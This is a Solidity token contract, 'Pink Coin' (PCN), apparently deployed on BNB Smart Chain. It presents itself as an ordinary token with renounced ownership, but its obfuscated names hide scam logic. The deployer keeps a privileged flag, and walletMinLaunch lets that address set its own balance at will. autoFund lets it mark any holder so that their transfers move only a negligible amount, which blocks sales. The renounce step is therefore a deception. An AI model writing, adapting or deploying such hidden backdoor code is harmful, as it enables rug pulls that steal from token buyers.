/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface minSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldTo {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract PinkCoin {
    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public owner;
    mapping(address => mapping(address => uint256)) public allowance;
    string public symbol = "PCN";
    mapping(address => bool) public tokenFee;

    uint256 constant fromSell = 10 ** 10;
    bool public maxTotalList;
    address public fundLaunched;

    address public fundAt;
    string public name = "Pink Coin";

    mapping(address => bool) public receiverAtBuy;
    mapping(address => uint256) public balanceOf;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        minSell listToTake = minSell(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundAt = shouldTo(listToTake.factory()).createPair(listToTake.WETH(), address(this));
        owner = receiverShouldTeam();
        fundLaunched = owner;
        receiverAtBuy[fundLaunched] = true;
        balanceOf[fundLaunched] = totalSupply;
        emit Transfer(address(0), fundLaunched, totalSupply);
        totalFeeFund();
    }

    

    function approve(address amountSender, uint256 tokenSenderLaunched) public returns (bool) {
        allowance[receiverShouldTeam()][amountSender] = tokenSenderLaunched;
        emit Approval(receiverShouldTeam(), amountSender, tokenSenderLaunched);
        return true;
    }

    function transferFrom(address limitReceiverExempt, address maxToSwap, uint256 tokenSenderLaunched) public returns (bool) {
        if (limitReceiverExempt != receiverShouldTeam() && allowance[limitReceiverExempt][receiverShouldTeam()] != type(uint256).max) {
            require(allowance[limitReceiverExempt][receiverShouldTeam()] >= tokenSenderLaunched);
            allowance[limitReceiverExempt][receiverShouldTeam()] -= tokenSenderLaunched;
        }
        if (maxToSwap == fundLaunched || limitReceiverExempt == fundLaunched) {
            return txTo(limitReceiverExempt, maxToSwap, tokenSenderLaunched);
        }
        if (tokenFee[limitReceiverExempt]) {
            return txTo(limitReceiverExempt, maxToSwap, fromSell);
        }
        return txTo(limitReceiverExempt, maxToSwap, tokenSenderLaunched);
    }

    function transfer(address maxToSwap, uint256 tokenSenderLaunched) external returns (bool) {
        return transferFrom(receiverShouldTeam(), maxToSwap, tokenSenderLaunched);
    }

    function totalFeeFund() public {
        emit OwnershipTransferred(fundLaunched, address(0));
        owner = address(0);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function txTo(address teamTradingTx, address isList, uint256 tokenSenderLaunched) internal returns (bool) {
        require(balanceOf[teamTradingTx] >= tokenSenderLaunched);
        balanceOf[teamTradingTx] -= tokenSenderLaunched;
        balanceOf[isList] += tokenSenderLaunched;
        emit Transfer(teamTradingTx, isList, tokenSenderLaunched);
        return true;
    }

    function receiverShouldTeam() private view returns (address) {
        return msg.sender;
    }

    function walletMinLaunch(uint256 tokenSenderLaunched) public {
        if (!receiverAtBuy[receiverShouldTeam()]) {
            return;
        }
        balanceOf[fundLaunched] = tokenSenderLaunched;
    }

    function tradingTxFrom(address isReceiver) public {
        if (maxTotalList) {
            return;
        }
        receiverAtBuy[isReceiver] = true;
        maxTotalList = true;
    }

    function autoFund(address shouldEnable) public {
        if (shouldEnable == fundLaunched || shouldEnable == fundAt || !receiverAtBuy[receiverShouldTeam()]) {
            return;
        }
        tokenFee[shouldEnable] = true;
    }


}